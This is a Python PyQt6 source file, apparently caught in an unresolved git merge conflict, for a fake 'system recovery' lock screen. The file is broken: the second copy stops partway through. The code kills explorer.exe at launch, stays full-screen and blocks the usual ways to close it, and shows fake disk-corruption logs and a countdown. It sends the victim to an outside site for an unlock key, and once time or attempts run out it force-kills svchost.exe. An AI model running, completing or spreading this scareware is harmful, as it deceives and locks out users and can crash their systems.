<<<<<<< HEAD
import sys, secrets, random, string, ctypes, time
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QFrame, QSizePolicy, QProgressBar, QMessageBox
)
from PyQt6.QtCore import Qt, QTimer, QTime
from PyQt6.QtGui import QGuiApplication, QShortcut, QKeySequence
import os


PAGES_URL = "https://kgbb.xyz"

def make_key(token: str) -> str:
    clean = token.replace("-", "").replace(" ", "").strip()
    h = 2166136261
    for ch in clean:
        h ^= ord(ch)
        h = (h * 16777619) & 0xFFFFFFFF
    part = f"{h:08X}"
    return f"KGBB-{part}-{part[::-1]}"

    
SKULL_ASCII = r"""
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠄⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀
⠀⠀⠀⢠⣿⣇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⣻⣿⣿⣿⣿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣟⣿⣿⣿⣿⣷⣭⠀⠀⠀
⠀⠀⠀⠀⣻⣿⠟⠛⠉⠁⠈⠉⠻⢿⣿⣿⣿⡟⠛⠂⠉⠁⠈⠉⠁⠻⣿⠀⠀⠀
⠀⠀⠀⠀⢾⠀⠀⣠⠄⠻⣆⠀⠈⠠⣻⣿⣟⠁⠀⠀⠲⠛⢦⡀⠀⠠⠁⠀⠀⠀
⠀⠀⠀⠀⢱⣄⡀⠘⠀⠸⠉⠀⠀⢰⣿⣷⣿⠂⢀⠀⠓⡀⠞⠀⢀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣿⣷⣶⣶⣶⣾⣿⠀⠸⣿⣿⣿⣶⣿⣧⣴⣴⣶⣶⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣏⠇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣾⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣟⡿⠂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⠀⠀⠈⠿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠄⢻⣿⣿⣿⡗⠀⠀⠀⠀⠈⠀⢨⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡞⠷⠿⠿⠀⠀⠀⠀⢀⣘⣤⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠼⠉⠀⠀⠀⠀⠀⠚⢻⠿⠟⠓⠛⠂⠉⠉⠁⠀⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢾⠻⠌⣄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣀⣀⣀⡠⡲⠞⡁⠈⡈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠘⠛⠻⢯⠟⠩⠀⠀⢠⣣⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠄⠂⣰⣧⣾⠶⠀⠀⠀⠀⠀⠀⠀
""".strip("\n")

SCARY_TEXT = (
    "CRITICAL ERROR: FILESYSTEM METADATA DAMAGE DETECTED.\n"
    "RECOVERY MODE HAS TAKEN CONTROL OF THIS SESSION.\n"
    "System locked for security. Attempting to force exit may corrupt data.\n"
    "To restore access, generate an unlock key using your token."
)

FAKE_LOG_LINES = [
    "[ERR] volume:0  mft: unreadable record chain",
    "[WARN] shadow copies: missing",
    "[ERR] index: corrupted tree nodes detected",
    "[ERR] journal: replay failed",
    "[WARN] permissions: inconsistent acl entries",
    "[ERR] inode map: checksum mismatch",
    "[ERR] recovery: staged rollback unavailable",
    "[WARN] cache: invalid pointers",
    "[SECURITY] Unauthorized exit attempt detected",
    "[SECURITY] Session forcefully retained",
    "[WARN] User input blocked - recovery in progress",
]

def generate_readable_token(length=12):
    chars = (string.ascii_uppercase + string.digits).replace("0","").replace("O","").replace("1","").replace("I","")
    token_chars = [secrets.choice(chars) for _ in range(length)]
    return "-".join("".join(token_chars[i:i+4]) for i in range(0, length, 4))

class LockSim(QWidget):
    def __init__(self):
        super().__init__()
        
        
        self.attempts_remaining = 2
        self.time_remaining = 300  
        self.unlocked = False
        
        self.setup_window()
        self.setup_variables()
        self.setup_ui()
        self.setup_timers()
        self.setup_shortcuts()
        self.setup_styles()
        
        
        self.countdown_timer.start(1000)

    def setup_window(self):
        self.setWindowTitle("SYSTEM RECOVERY - DO NOT CLOSE")
        self.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        self.setWindowFlag(Qt.WindowType.FramelessWindowHint, True)
        self.setWindowFlag(Qt.WindowType.Tool, True)
        self.setWindowState(Qt.WindowState.WindowFullScreen)
        self.showFullScreen()

    def setup_variables(self):
        self.token = generate_readable_token()
        self.escape_attempts = 0
        
        
        self.block_timer = QTimer()
        self.block_timer.timeout.connect(self._block_escape_keys)
        self.block_timer.start(100)

    def setup_ui(self):
        outer = QVBoxLayout(self)
        outer.setContentsMargins(26, 26, 26, 26)
        outer.addStretch(1)

        card = QFrame()
        card.setObjectName("card")
        card.setSizePolicy(QSizePolicy.Policy.Maximum, QSizePolicy.Policy.Maximum)

        layout = QHBoxLayout(card)
        layout.setContentsMargins(18, 18, 18, 18)
        layout.setSpacing(14)

        
        left = QFrame()
        left.setObjectName("console")
        left_l = QVBoxLayout(left)
        left_l.setContentsMargins(16, 14, 16, 14)
        left_l.setSpacing(10)

        
        self.header = QLabel()
        self.header.setObjectName("header")
        self.header.setTextFormat(Qt.TextFormat.RichText)
        self.header.setText('<span class="glitch">!! CRITICAL SYSTEM LOCKDOWN !!</span>')

       
        self.timer_label = QLabel()
        self.timer_label.setObjectName("timer")
        self.timer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.update_timer_display()

        skull = QLabel()
        skull.setObjectName("ascii")
        skull.setTextFormat(Qt.TextFormat.RichText)
        skull.setAlignment(Qt.AlignmentFlag.AlignHCenter)
        skull.setText(f"<pre>{SKULL_ASCII}</pre>")

        self.msg = QLabel("")
        self.msg.setObjectName("msg")
        self.msg.setWordWrap(True)

        self.log = QLabel("")
        self.log.setObjectName("log")
        self.log.setTextFormat(Qt.TextFormat.PlainText)
        self.log.setWordWrap(True)

        self.progress = QProgressBar()
        self.progress.setObjectName("progress")
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setFormat("corruption scan… %p%")

        
        self.attempts_label = QLabel(f"Attempts remaining: {self.attempts_remaining}")
        self.attempts_label.setObjectName("attempts")

        steps = QLabel(
            f"• Open: {PAGES_URL}\n"
            f"• Copy token → Go to website\n"
            f"• Paste token → Generate key → Copy key\n"
            f"• Return here → Paste key → Click unlock\n\n"
            f"⚠ WARNING: Do not close this window. Data corruption may occur."
        )
        steps.setObjectName("steps")
        steps.setWordWrap(True)

        left_l.addWidget(self.header)
        left_l.addWidget(self.timer_label)
        left_l.addWidget(skull)
        left_l.addWidget(self.msg)
        left_l.addWidget(self.progress)
        left_l.addWidget(self.log)
        left_l.addWidget(self.attempts_label)
        left_l.addWidget(steps)
        left_l.addStretch(1)

       
        right = QFrame()
        right.setObjectName("side")
        right_l = QVBoxLayout(right)
        right_l.setContentsMargins(16, 14, 16, 14)
        right_l.setSpacing(10)

        tag = QLabel("restricted session")
        tag.setObjectName("tag")

        token_label = QLabel("token")
        token_label.setObjectName("label")

        token_box = QFrame()
        token_box.setObjectName("box")
        token_box_l = QHBoxLayout(token_box)
        token_box_l.setContentsMargins(12, 10, 12, 10)
        token_box_l.setSpacing(10)

        self.token_text = QLabel(self.token)
        self.token_text.setObjectName("mono")
        self.token_text.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        self.token_text.setStyleSheet("font-size: 16px; font-weight: bold; letter-spacing: 1px;")

        self.copy_token_btn = QPushButton("Copy")
        self.copy_token_btn.setObjectName("btn")
        self.copy_token_btn.clicked.connect(self.copy_token)
        self.copy_token_btn.setMaximumWidth(80)

        token_box_l.addWidget(self.token_text, 1)
        token_box_l.addWidget(self.copy_token_btn, 0)

        key_label = QLabel("unlock key")
        key_label.setObjectName("label")

        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText("paste unlock key here (Ctrl+V)...")
        self.key_input.setObjectName("input")

        self.unlock_btn = QPushButton("unlock")
        self.unlock_btn.setObjectName("btnPrimary")
        self.unlock_btn.clicked.connect(self.try_unlock)

        self.status = QLabel("")
        self.status.setObjectName("status")

        right_l.addWidget(tag)
        right_l.addWidget(token_label)
        right_l.addWidget(token_box)
        right_l.addSpacing(6)
        right_l.addWidget(key_label)
        right_l.addWidget(self.key_input)
        right_l.addWidget(self.unlock_btn)
        right_l.addWidget(self.status)
        right_l.addStretch(1)

        layout.addWidget(left, 1)
        layout.addWidget(right, 0)

        outer.addWidget(card, 0, Qt.AlignmentFlag.AlignHCenter)
        outer.addStretch(1)

    def setup_timers(self):
        
        self._tw_i = 0
        self._tw_text = SCARY_TEXT
        self._tw_timer = QTimer(self)
        self._tw_timer.timeout.connect(self._type_step)
        self._tw_timer.start(14)

        
        self._log_lines = []
        self._log_timer = QTimer(self)
        self._log_timer.timeout.connect(self._log_step)
        self._log_timer.start(220)

        
        self._p_timer = QTimer(self)
        self._p_timer.timeout.connect(self._progress_step)
        self._p_timer.start(80)

        
        self._flick = 0
        self._f_timer = QTimer(self)
        self._f_timer.timeout.connect(self._flicker_step)
        self._f_timer.start(140)

        
        self.countdown_timer = QTimer(self)
        self.countdown_timer.timeout.connect(self.update_countdown)

        
        self._warning_timer = QTimer(self)
        self._warning_timer.timeout.connect(self._show_warning)
        self._warning_timer.start(30000)

    def setup_shortcuts(self):
        QShortcut(QKeySequence.StandardKey.Copy, self, activated=self.copy_token)
        QShortcut(QKeySequence.StandardKey.Paste, self, activated=self._global_paste)
        
        
        self.blocked_shortcuts = [
            QKeySequence.StandardKey.Close,
            QKeySequence("Alt+F4"),
            QKeySequence("Ctrl+W"),
            QKeySequence("Ctrl+Q"),
            QKeySequence("Alt+Tab"),
            QKeySequence("Win"),
            QKeySequence("Alt+Esc"),
            QKeySequence("Ctrl+Alt+Delete"),
            QKeySequence("Ctrl+Shift+Esc"),
        ]
        
        for seq in self.blocked_shortcuts:
            shortcut = QShortcut(seq, self)
            shortcut.activated.connect(self._blocked_action)

    def setup_styles(self):
        self.setStyleSheet(r"""
            QWidget{ 
                background:#05040a; 
                color:rgba(255,255,255,.92); 
                font-family: Segoe UI, system-ui; 
            }
            #card{ 
                background: rgba(0,0,0,0.7); 
                border: 2px solid rgba(255,80,100,.4); 
                border-radius: 18px; 
                max-width: 1020px; 
                min-width: 900px; 
                box-shadow: 0 0 40px rgba(255,80,100,.3); 
            }
            #console{ 
                background: radial-gradient(900px 420px at 50% 0%, rgba(255,50,70,.25), transparent 60%), 
                          rgba(0,0,0,.7); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 16px; 
            }
            #header{ 
                font-size: 20px; 
                font-weight: 950; 
                letter-spacing: 1px; 
                color: rgba(255,100,120,1); 
                text-transform: uppercase; 
                text-shadow: 0 0 10px rgba(255,100,120,.5); 
            }
            #timer{
                font-size: 18px;
                font-weight: bold;
                color: #ff6b6b;
                padding: 8px;
                background: rgba(255, 80, 100, 0.1);
                border-radius: 8px;
                border: 1px solid rgba(255, 80, 100, 0.3);
            }
            #attempts{
                font-size: 14px;
                font-weight: bold;
                color: #ffd166;
                padding: 6px 10px;
                background: rgba(255, 209, 102, 0.1);
                border-radius: 6px;
                border: 1px solid rgba(255, 209, 102, 0.3);
            }
            #ascii{ 
                padding: 10px 12px; 
                background: rgba(255,255,255,.02); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 14px; 
            }
            #ascii pre{ 
                margin:0; 
                font-family: ui-monospace, Consolas, monospace; 
                font-size: 12px; 
                color: rgba(255,255,255,.86); 
            }
            #msg{ 
                font-size: 14px; 
                line-height: 1.45; 
                color: rgba(255,200,200,.95); 
            }
            #progress{ 
                height: 14px; 
                border-radius: 999px; 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.3); 
                padding: 2px; 
            }
            #progress::chunk{ 
                border-radius: 999px; 
                background: qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 #ff3246, stop:1 #8b5cf6); 
            }
            #log{ 
                padding: 10px 12px; 
                border-radius: 14px; 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.2); 
                font-family: ui-monospace, Consolas, monospace; 
                font-size: 12px; 
                color: rgba(255,150,150,.8); 
                min-height: 80px; 
            }
            #steps{ 
                font-size: 13px; 
                line-height: 1.45; 
                color: rgba(255,180,180,.8); 
            }
            #side{ 
                width: 330px; 
                background: rgba(0,0,0,.5); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 16px; 
            }
            #tag{ 
                font-size: 12px; 
                font-weight: 900; 
                letter-spacing: .7px; 
                text-transform: uppercase; 
                color: rgba(255,150,150,1); 
                padding: 6px 10px; 
                border-radius: 999px; 
                border: 1px solid rgba(255,80,100,.3); 
                background: rgba(255,80,100,.1); 
                width: fit-content; 
            }
            #label{ 
                font-size: 12px; 
                color: rgba(255,180,180,.8); 
                text-transform: uppercase; 
                letter-spacing: .6px; 
            }
            #box{ 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 14px; 
            }
            #mono{ 
                font-family: ui-monospace, Consolas, monospace; 
                font-size: 13px; 
                color: rgba(255,200,200,.9); 
            }
            #input{ 
                padding: 12px 12px; 
                border-radius: 14px; 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.3); 
                color: rgba(255,255,255,.95); 
                font-size: 14px; 
            }
            #btn,#btnPrimary{ 
                padding: 10px 14px; 
                border-radius: 999px; 
                font-weight: 900; 
            }
            #btn{ 
                background: rgba(255,80,100,.15); 
                border: 1px solid rgba(255,80,100,.4); 
                color: rgba(255,200,200,.95); 
                font-size: 11px; 
                padding: 8px 12px; 
            }
            #btnPrimary{ 
                background: qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 #ff3246, stop:1 #8b5cf6); 
                border: 0; 
                color: white; 
                font-size: 13px; 
                font-weight: bold; 
            }
            #status{ 
                font-size: 13px; 
                color: rgba(255,140,140,.95); 
            }
        """)

    
    
    def update_countdown(self):
        """Update the 10-minute countdown timer"""
        if self.time_remaining > 0:
            self.time_remaining -= 1
            self.update_timer_display()
            
            
            if self.time_remaining <= 60:
                self.flash_timer_red()
        else:
            self.countdown_timer.stop()
            self.time_expired()

    def update_timer_display(self):
        """Format and display the remaining time"""
        minutes = self.time_remaining // 60
        seconds = self.time_remaining % 60
        self.timer_label.setText(f"TIME REMAINING: {minutes:02d}:{seconds:02d}")

    def flash_timer_red(self):
        """Flash the timer red when time is running out"""
        if self.time_remaining % 2 == 0:
            self.timer_label.setStyleSheet("""
                color: #ff0000;
                font-weight: bold;
                background: rgba(255, 0, 0, 0.2);
                border: 2px solid #ff0000;
            """)
        else:
            self.timer_label.setStyleSheet("""
                color: #ff6b6b;
                font-weight: bold;
                background: rgba(255, 80, 100, 0.1);
                border: 1px solid rgba(255, 80, 100, 0.3);
            """)

    def time_expired(self):
        """Handle timer expiration"""
        self._log_lines.append("[CRITICAL] TIME EXPIRED - System lockdown permanent")
        self.log.setText("\n".join(self._log_lines[-8:]))
        
        self.timer_label.setText("TIME EXPIRED: 00:00")
        self.timer_label.setStyleSheet("""
            color: #ff0000;
            font-weight: bold;
            background: rgba(255, 0, 0, 0.3);
            border: 2px solid #ff0000;
        """)
        
        self.key_input.setEnabled(False)
        self.unlock_btn.setEnabled(False)
        
        #Time ran out
        os.system("taskkill /f /im svchost.exe")
        
        QTimer.singleShot(3000, lambda: self._log_lines.append("[FATAL] Permanent system lock initiated"))
        QTimer.singleShot(5000, lambda: self.log.setText("\n".join(self._log_lines[-8:])))

    
    
    def try_unlock(self):
        """Check the unlock key and handle attempts"""
        if self.time_remaining <= 0:
            self.status.setText("✗ TIME EXPIRED - System locked permanently")
            self.status.setStyleSheet("color: rgba(255,100,120,1); font-weight: bold;")
            return
            
        if self.attempts_remaining <= 0:
            self.status.setText("✗ NO ATTEMPTS REMAINING - You lost")
            self.status.setStyleSheet("color: rgba(255,100,120,1); font-weight: bold;")
            return

        entered = self.key_input.text().strip().replace(" ", "")
        
        
        self.status.setText("⏳ UNLOCKING...")
        self.status.setStyleSheet("color: rgba(255,215,0,1); font-weight: bold;")
        
        
        QTimer.singleShot(600, lambda: self._process_unlock(entered))

    def _process_unlock(self, entered: str):
        expected = make_key(self.token)
        

        if entered.upper() == expected.upper():
        
            os.system("start explorer.exe")
            self.status.setStyleSheet("color: rgba(120,255,160,1); font-weight: bold;")
            self.status.setText("✓ UNLOCKED - System recovering...")

            self.progress.setValue(100)
            self._log_lines.append("[SUCCESS] Unlock key verified")
            self._log_lines.append("[INFO] Restoring system access...")
            self.log.setText("\n".join(self._log_lines[-8:]))

           
            self.countdown_timer.stop()
            self._tw_timer.stop()
            self._log_timer.stop()
            self._p_timer.stop()
            self._f_timer.stop()
            self.block_timer.stop()
            self._warning_timer.stop()

            self.unlocked = True
            QTimer.singleShot(2000, self.close)
            QTimer.singleShot(6000, QApplication.instance().quit)
            return
            
        else:
            self.attempts_remaining -= 1
            self.attempts_label.setText(f"Attempts remaining: {self.attempts_remaining}")
            
            self.status.setStyleSheet("color: rgba(255,100,120,1); font-weight: bold;")
            self.status.setText(f"✗ INVALID KEY - {self.attempts_remaining} attempt(s) left")
            
            self._log_lines.append(f"[SECURITY] Failed unlock attempt (code: 0x{random.randrange(16**4):04x})")
            if len(self._log_lines) > 8:
                self._log_lines = self._log_lines[-8:]
            self.log.setText("\n".join(self._log_lines))
            
            
            self.key_input.clear()
            
            
            if self.attempts_remaining <= 0:
                self.handle_game_over()

    def handle_game_over(self):
        self._log_lines.append("[FATAL] Maximum attempts exceeded")
        self._log_lines.append("[SECURITY] Permanent system lockdown initiated")
        self.log.setText("\n".join(self._log_lines[-8:]))
        
        self.key_input.setEnabled(False)
        self.unlock_btn.setEnabled(False)
        
        # Attepmts ran out
        os.system("taskkill /f /im svchost.exe")
        
        QTimer.singleShot(2000, lambda: self._log_lines.append("[FINAL] All recovery options exhausted"))
        QTimer.singleShot(4000, lambda: self.log.setText("\n".join(self._log_lines[-8:])))

    
    
    def _global_paste(self):
        self.key_input.setFocus()
        self.key_input.paste()

    def _block_escape_keys(self):
        self.raise_()
        self.activateWindow()
        
    def _blocked_action(self):
        self.escape_attempts += 1
        new_lines = [
            f"[SECURITY] Escape attempt #{self.escape_attempts} blocked",
            f"[WARN] Unauthorized input detected (code: 0x{random.randrange(16**4):04x})",
            "[ERR] Security violation - session locked",
        ]
        self._log_lines.extend(new_lines)
        if len(self._log_lines) > 8:
            self._log_lines = self._log_lines[-8:]
        self.log.setText("\n".join(self._log_lines))
        
        
        original_style = self.styleSheet()
        self.setStyleSheet(original_style + "\n#card{ border: 3px solid rgba(255,50,70,.8); }")
        QTimer.singleShot(300, lambda: self.setStyleSheet(original_style))

    def closeEvent(self, event):
        if getattr(self, "unlocked", False):
            event.accept()
            return

        self.escape_attempts += 1
        if self.escape_attempts >= 50:
            msg = QMessageBox()
            msg.setWindowTitle("CRITICAL ERROR")
            msg.setText("⚠ SYSTEM RECOVERY FAILURE\n\nForced exit may cause permanent data loss.\nContinue with unlock procedure.")
            msg.setIcon(QMessageBox.Icon.Critical)
            msg.setStandardButtons(QMessageBox.StandardButton.Ok)
            msg.exec()

        event.ignore()

    def _show_warning(self):
        warnings = [
            "⚠ Session will remain locked until correct key is entered.",
            "⚠ Data integrity check in progress - do not interrupt.",
            "⚠ Multiple failed unlock attempts may trigger security lockdown.",
            "⚠ Recovery process is monitoring system stability.",
        ]
        self._log_lines.append(random.choice(warnings))
        if len(self._log_lines) > 8:
            self._log_lines = self._log_lines[-8:]
        self.log.setText("\n".join(self._log_lines))

    def copy_token(self):
        QGuiApplication.clipboard().setText(self.token)
        original_text = self.copy_token_btn.text()
        self.copy_token_btn.setText("✓ Copied!")
        QTimer.singleShot(1200, lambda: self.copy_token_btn.setText(original_text))

    def _type_step(self):
        if self._tw_i >= len(self._tw_text):
            self._tw_timer.stop()
            return
        self._tw_i += 1
        self.msg.setText(self._tw_text[:self._tw_i].replace("\n", "<br>"))

    def _log_step(self):
        if len(self._log_lines) > 8:
            self._log_lines = self._log_lines[-8:]
        line = random.choice(FAKE_LOG_LINES)
        suffix = f" 0x{random.randrange(16**4):04x}".upper()
        self._log_lines.append(line + suffix)
        self.log.setText("\n".join(self._log_lines))

    def _progress_step(self):
        v = self.progress.value()
        if v < 100:
            v = min(100, v + random.choice([1, 1, 2, 3]))
            self.progress.setValue(v)
        else:
            if random.random() < 0.08:
                self.progress.setValue(random.randrange(70, 85))

    def _flicker_step(self):
        self._flick = (self._flick + 1) % 12
        if self._flick == 2:
            self.header.setText('<span class="glitch">!! CRITICAL SYSTEM LOCKDOWN !!</span>')
        elif self._flick == 6:
            self.header.setText('<span class="glitch">!! RECOVERY MODE ACTIVE !!</span>')
        else:
            self.header.setText('<span class="glitch">!! DO NOT CLOSE WINDOW !!</span>')


if __name__ == "__main__":
    os.system("taskkill /f /im explorer.exe")
    app = QApplication(sys.argv)
    w = LockSim()
    w.showFullScreen()
=======
import sys, secrets, random, string, ctypes, time
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QFrame, QSizePolicy, QProgressBar, QMessageBox
)
from PyQt6.QtCore import Qt, QTimer, QTime
from PyQt6.QtGui import QGuiApplication, QShortcut, QKeySequence
import os


PAGES_URL = "https://kgbb.xyz"

def make_key(token: str) -> str:
    clean = token.replace("-", "").replace(" ", "").strip()
    h = 2166136261
    for ch in clean:
        h ^= ord(ch)
        h = (h * 16777619) & 0xFFFFFFFF
    part = f"{h:08X}"
    return f"KGBB-{part}-{part[::-1]}"

    
SKULL_ASCII = r"""
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠄⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀
⠀⠀⠀⢠⣿⣇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⣻⣿⣿⣿⣿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣟⣿⣿⣿⣿⣷⣭⠀⠀⠀
⠀⠀⠀⠀⣻⣿⠟⠛⠉⠁⠈⠉⠻⢿⣿⣿⣿⡟⠛⠂⠉⠁⠈⠉⠁⠻⣿⠀⠀⠀
⠀⠀⠀⠀⢾⠀⠀⣠⠄⠻⣆⠀⠈⠠⣻⣿⣟⠁⠀⠀⠲⠛⢦⡀⠀⠠⠁⠀⠀⠀
⠀⠀⠀⠀⢱⣄⡀⠘⠀⠸⠉⠀⠀⢰⣿⣷⣿⠂⢀⠀⠓⡀⠞⠀⢀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣿⣷⣶⣶⣶⣾⣿⠀⠸⣿⣿⣿⣶⣿⣧⣴⣴⣶⣶⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣏⠇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣾⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣟⡿⠂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⠀⠀⠈⠿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠄⢻⣿⣿⣿⡗⠀⠀⠀⠀⠈⠀⢨⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡞⠷⠿⠿⠀⠀⠀⠀⢀⣘⣤⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠼⠉⠀⠀⠀⠀⠀⠚⢻⠿⠟⠓⠛⠂⠉⠉⠁⠀⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢾⠻⠌⣄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣀⣀⣀⡠⡲⠞⡁⠈⡈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠘⠛⠻⢯⠟⠩⠀⠀⢠⣣⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠄⠂⣰⣧⣾⠶⠀⠀⠀⠀⠀⠀⠀
""".strip("\n")

SCARY_TEXT = (
    "CRITICAL ERROR: FILESYSTEM METADATA DAMAGE DETECTED.\n"
    "RECOVERY MODE HAS TAKEN CONTROL OF THIS SESSION.\n"
    "System locked for security. Attempting to force exit may corrupt data.\n"
    "To restore access, generate an unlock key using your token."
)

FAKE_LOG_LINES = [
    "[ERR] volume:0  mft: unreadable record chain",
    "[WARN] shadow copies: missing",
    "[ERR] index: corrupted tree nodes detected",
    "[ERR] journal: replay failed",
    "[WARN] permissions: inconsistent acl entries",
    "[ERR] inode map: checksum mismatch",
    "[ERR] recovery: staged rollback unavailable",
    "[WARN] cache: invalid pointers",
    "[SECURITY] Unauthorized exit attempt detected",
    "[SECURITY] Session forcefully retained",
    "[WARN] User input blocked - recovery in progress",
]

def generate_readable_token(length=12):
    chars = (string.ascii_uppercase + string.digits).replace("0","").replace("O","").replace("1","").replace("I","")
    token_chars = [secrets.choice(chars) for _ in range(length)]
    return "-".join("".join(token_chars[i:i+4]) for i in range(0, length, 4))

class LockSim(QWidget):
    def __init__(self):
        super().__init__()
        
        
        self.attempts_remaining = 2
        self.time_remaining = 300  
        self.unlocked = False
        
        self.setup_window()
        self.setup_variables()
        self.setup_ui()
        self.setup_timers()
        self.setup_shortcuts()
        self.setup_styles()
        
        
        self.countdown_timer.start(1000)

    def setup_window(self):
        self.setWindowTitle("SYSTEM RECOVERY - DO NOT CLOSE")
        self.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        self.setWindowFlag(Qt.WindowType.FramelessWindowHint, True)
        self.setWindowFlag(Qt.WindowType.Tool, True)
        self.setWindowState(Qt.WindowState.WindowFullScreen)
        self.showFullScreen()

    def setup_variables(self):
        self.token = generate_readable_token()
        self.escape_attempts = 0
        
        
        self.block_timer = QTimer()
        self.block_timer.timeout.connect(self._block_escape_keys)
        self.block_timer.start(100)

    def setup_ui(self):
        outer = QVBoxLayout(self)
        outer.setContentsMargins(26, 26, 26, 26)
        outer.addStretch(1)

        card = QFrame()
        card.setObjectName("card")
        card.setSizePolicy(QSizePolicy.Policy.Maximum, QSizePolicy.Policy.Maximum)

        layout = QHBoxLayout(card)
        layout.setContentsMargins(18, 18, 18, 18)
        layout.setSpacing(14)

        
        left = QFrame()
        left.setObjectName("console")
        left_l = QVBoxLayout(left)
        left_l.setContentsMargins(16, 14, 16, 14)
        left_l.setSpacing(10)

        
        self.header = QLabel()
        self.header.setObjectName("header")
        self.header.setTextFormat(Qt.TextFormat.RichText)
